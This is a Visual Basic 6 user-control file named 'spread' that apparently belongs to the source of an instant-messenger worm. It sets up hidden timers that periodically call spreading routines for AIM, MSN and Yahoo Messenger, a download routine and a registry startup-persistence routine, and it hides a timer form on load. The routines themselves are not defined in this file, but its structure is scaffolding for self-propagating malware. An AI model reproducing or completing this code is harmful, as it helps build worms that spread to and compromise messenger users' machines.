VERSION 5.00
Begin VB.UserControl spread 
   BackColor       =   &H80000015&
   ClientHeight    =   405
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1830
   ScaleHeight     =   405
   ScaleWidth      =   1830
   Begin VB.Timer AIMSpread_Timer 
      Interval        =   19500
      Left            =   0
      Top             =   0
   End
   Begin VB.Timer MSNSpread_Timer 
      Interval        =   19500
      Left            =   360
      Top             =   0
   End
   Begin VB.Timer YSpread_Timer 
      Interval        =   11250
      Left            =   720
      Top             =   0
   End
   Begin VB.Timer TDownload 
      Enabled         =   0   'False
      Interval        =   2500
      Left            =   1080
      Top             =   0
   End
   Begin VB.Timer TReg 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1440
      Top             =   0
   End
End
Attribute VB_Name = "spread"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Sub AIMSpread_Timer_Timer()
Call AIMSpreadTimer
End Sub

Private Sub Form_Load()
fTimers.Visible = False
End Sub

Private Sub MSNSpread_Timer_Timer()
Call MSNSpreadTimer
End Sub

Private Sub TDownload_Timer()
Call DownloadTimer
End Sub

Private Sub TReg_Timer()
RegStartupTimer
End Sub

Private Sub YSpread_Timer_Timer()
Call YahooSpreadTimer
End Sub

